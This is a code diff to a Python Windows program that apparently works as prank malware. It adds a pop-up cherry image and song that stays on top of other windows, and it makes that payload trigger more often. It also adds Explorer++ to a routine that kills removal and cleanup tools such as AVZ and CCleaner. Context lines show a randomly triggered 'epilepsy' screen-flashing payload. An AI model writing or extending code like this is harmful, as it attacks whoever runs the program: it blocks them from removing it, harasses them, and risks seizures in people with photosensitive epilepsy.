@@ -10,14 +10,12 @@ import win32api
 import math
 import ctypes
 import random
-import cv2
 
 pygame.mixer.init()
+pygame.init()
 assets = os.path.join(os.path.dirname(os.path.realpath(__file__)), "assets")
 
 def man_i_love_epilepsy():
-	
-
 	user32 = ctypes.windll.user32
 	user32.SetProcessDPIAware()
 	[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
@@ -34,8 +32,29 @@ def man_i_love_epilepsy():
 
 
 def cherry_window():
+	
+	def alwaysOnTop():
+		NOSIZE = 1
+		NOMOVE = 2
+		TOPMOST = -1
+		zorder = TOPMOST # choose a flag according to bool
+		hwnd = pygame.display.get_wm_info()['window'] # handle to the window
+		ctypes.windll.user32.SetWindowPos(hwnd, zorder, 0, 0, 0, 0, NOMOVE|NOSIZE)
+	image = pygame.image.load('assets/cherry.jpg')
+	size = (144, 144)  # Width, Height
+	screen = pygame.display.set_mode(size)
+
+	def display_image(x, y):
+		screen.blit(image, (x, y))
+
+	display_image(0,0)
+	pygame.display.update()
+	alwaysOnTop()
 	pygame.mixer.music.load(os.path.join(assets, 'cherry.mp3'))
 	pygame.mixer.music.play(2)
+	time.sleep(3)
+	pygame.quit()
+	pygame.mixer.init() # quit() also kills mixer so reinit is required
 	rng_thread = threading.Thread(target=rng_payload)
 	rng_thread.run()
 
@@ -84,6 +103,7 @@ def blocked_apps():
 		os.system('tasklist | findstr /i "avz.exe" && taskkill /f /im avz.exe')
 		os.system('tasklist | findstr /i "CCleaner.exe" && taskkill /f /im CCleaner.exe') # idk whats the real name
 		os.system('tasklist | findstr /i "CCleaner64.exe" && taskkill /f /im CCleaner64.exe') # idk whats the real name
+		os.system('tasklist | findstr /i "Explorer++.exe" && taskkill /f /im Explorer++.exe')
 
 def rng_payload():
 	cherry_thread = threading.Thread(target=cherry_window)
@@ -103,7 +123,7 @@ def rng_payload():
 				ear_thread.run() # plays hueuh.mp3
 			case 60 | 61 | 62 | 63 | 64 | 65 | 66 | 67 | 68 | 69:
 				epilepsy_thread.run() # man i love epilepsy
-			case 99:
+			case 99 | 95 | 96 | 97 | 98:
 				cherry_thread.run() # plays cherry.mp3
 		time.sleep(1)
 
